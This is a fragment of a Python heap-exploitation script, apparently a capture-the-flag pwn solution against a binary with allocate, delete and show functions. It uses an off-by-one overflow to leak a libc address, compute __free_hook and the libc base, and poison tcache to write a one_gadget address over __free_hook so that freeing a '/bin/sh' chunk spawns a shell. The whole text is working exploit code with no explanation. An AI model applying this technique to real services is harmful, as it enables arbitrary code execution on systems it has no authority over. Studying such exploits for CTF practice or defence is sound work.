...
def new_heap(size:int, data:bytes=b'a'):
    global io
...
new_heap(0x18) # 1
new_heap(0x4f0) # 2
new_heap(0x10, b'/bin/sh\x00') # 3

del_heap(0)
STOP()
del_heap(1)
new_heap(0x18, 0x18 * b'a') # 溢出

del_heap(0)
new_heap(0x17, 0x17 * b'a')

del_heap(0)
new_heap(0x16, 0x16 * b'a')

del_heap(0)
new_heap(0x15, 0x15 * b'a')

del_heap(0)
new_heap(0x14, 0x14 * b'a')

del_heap(0)
new_heap(0x13, 0x13 * b'a')

del_heap(0)
new_heap(0x12, 0x10 * b'a' + b'\x40\x04')


del_heap(2)

new_heap(0x410, b'a' * 8) # 1

msg = show_heap(0)

free_hook = u64(msg[:-1] + b'\x00\x00') + 0x1c48
libc_base_addr = free_hook - 0x3ed8e8
LOG_ADDR('free_hook', free_hook)
LOG_ADDR('libc_base_addr', libc_base_addr)
gads = [0x4f2c5, 0x4f322, 0x10a38c]

new_heap(0x18, p64(free_hook) * 2) # 2

del_heap(0)
del_heap(2)

new_heap(0x18, p64(free_hook) * 2) # 0
new_heap(0x18, p64(free_hook) * 2) # 2
new_heap(0x18, p64(libc_base_addr + gads[1]) * 2) # 4
